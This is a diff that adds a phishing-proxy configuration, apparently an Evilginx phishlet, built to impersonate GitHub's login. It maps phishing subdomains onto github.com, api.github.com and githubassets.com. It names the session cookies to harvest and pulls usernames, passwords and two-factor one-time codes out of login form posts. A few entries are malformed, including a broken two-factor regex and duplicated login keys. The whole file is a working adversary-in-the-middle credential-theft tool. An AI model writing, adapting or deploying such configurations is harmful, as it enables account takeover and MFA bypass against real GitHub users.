@@ -1,0 +1,40 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'github.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'github.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'github', orig_sub: 'github', domain: 'githubassets.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'collector', orig_sub: 'collector', domain: 'github.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'github.com', orig_sub: 'github', domain: 'github.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html,application/xhtml+xml,application']}
+  - {triggers_on: 'collector.github.com', orig_sub: 'collector', domain: 'github.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html,application/xhtml+xml,application']}
+  - {triggers_on: 'api.github.com', orig_sub: 'api', domain: 'github.com', search: 'href="https://{hostname}', replace: '', mimes: ['text/html,application/xhtml+xml,application']}
+
+auth_tokens:
+  - domain: '.github.com'
+    keys: ['logged_in', 'dotcom_user']
+  - domain: 'collector.github.com'
+    keys: ['user_session', '_gh_sess']
+  - domain: 'api.github.com'
+    keys: ['user_session', '_gh_sess']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  two-factor:
+    key: 'app_otp'
+    search: '(*/*)'
+    type: 'post'
+
+login:
+  domain: 'github.com'
+  path: '/login'
+  domain: 'github.com'
+  path: '/sessions/two-factor'
